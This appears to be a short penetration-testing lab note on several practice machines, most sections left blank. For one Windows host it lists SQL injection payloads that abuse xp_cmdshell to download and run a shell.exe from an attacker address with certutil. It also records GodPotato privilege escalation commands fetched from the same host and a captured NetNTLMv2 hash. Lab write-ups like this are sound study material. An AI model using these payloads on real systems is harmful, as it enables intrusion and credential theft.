# VM 3
- 192.168.214.120
## Foothold


# VM 4
- 192.168.214.121 Windows
## FootHold
- Ez SQLi
    ``` 
    ';EXEC master.dbo.xp_cmdshell 'ping 192.168.45.219';--
    ';EXEC master.dbo.xp_cmdshell 'certutil -urlcache -split -f http://192.168.45.219/shell.exe C:\\Windows\temp\shell.exe';--
    ';EXEC master.dbo.xp_cmdshell 'cmd /c C:\\Windows\\temp\\shell.exe';--
    ```
## Root 
- SeImpersonate Permission Found & NET4.0 -> GodPotato
  ```
    iwr -uri http://192.168.45.219/GodPotato-NET4.exe -Outfile GodPotato-NET4.exe
    .\GodPotato-NET4.exe -cmd 'whoami'
    .\GodPotato-NET4.exe -cmd 'C:\Windows\temp\shell.exe'
   ```
- Interesting Info
    1. ```  Version: NetNTLMv2
  Hash:    WEB02$::MEDTECH:1122334455667788:757d0de376d8456d510a56bbc91d2ab2:0101000000000000229fe7efdce0da013a25e15c16fb223a000000000800300030000000000000000000000000300000d8c929a18f8306528b604ac0f3f091c5301c8c3d9d4689b5c867902e15f0f4230a00100000000000000000000000000000000000090000000000000000000000 ```
    2. 


# VM 5
- 192.168.214.122

